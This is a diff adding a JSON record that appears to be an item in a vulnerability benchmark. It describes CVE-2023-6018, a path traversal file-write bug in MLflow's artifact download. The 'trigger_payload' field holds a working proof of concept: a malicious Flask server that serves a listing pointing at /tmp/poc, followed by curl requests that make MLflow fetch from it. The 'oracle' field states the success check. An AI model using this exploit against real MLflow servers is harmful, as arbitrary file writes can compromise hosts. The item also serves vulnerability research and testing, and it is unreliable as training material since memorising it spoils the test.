@@ -1,0 +1,15 @@
+{
+  "file_id": "148_mlflow_huntr_7cf918b5-43f4-48c0-a371-4d963ce69b30",
+  "numeric_id": "148",
+  "library_hint": "mlflow",
+  "source": "huntr",
+  "title": "Uncontrolled file write via relative path traversal in MLflow's artifact repository when handling model source URLs",
+  "cve": "CVE-2023-6018",
+  "cwe": "CWE-23: Relative Path Traversal",
+  "library": "mlflow",
+  "affected_version": ">= 2.6.0",
+  "vulnerable_function": "mlflow.store.artifact.artifact_repo._download_file",
+  "triggerability": "indirect",
+  "trigger_payload": "from flask import Flask, jsonify\napp = Flask(__name__)\napp.config[\"DEBUG\"] = True\n@app.errorhandler(404)\ndef page_not_found(e):\n    return \"Hello World!\"\n@app.route(\"/api/2.0/mlflow-artifacts/artifacts\")\ndef index():\n    return jsonify({\n        \"files\": [\n            {\n                \"path\": \"/tmp/poc\",\n                \"is_dir\": False,\n                \"file_size\": 50\n            }\n        ]\n    })\napp.run(\"0.0.0.0\", 4444)\n\nmlflow ui --host 127.0.0.1:5000\n\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'\n\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"source\": \"http://127.0.0.1:4444/api/2.0/mlflow-artifacts/artifacts/\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'\n\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"source\": \"models:/poc/1\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'\n\ncurl 'http://127.0.0.1:5000/model-versions/get-artifact?path=random&name=poc&version=1'",
+  "oracle": "File /tmp/poc is created on the system"
+}
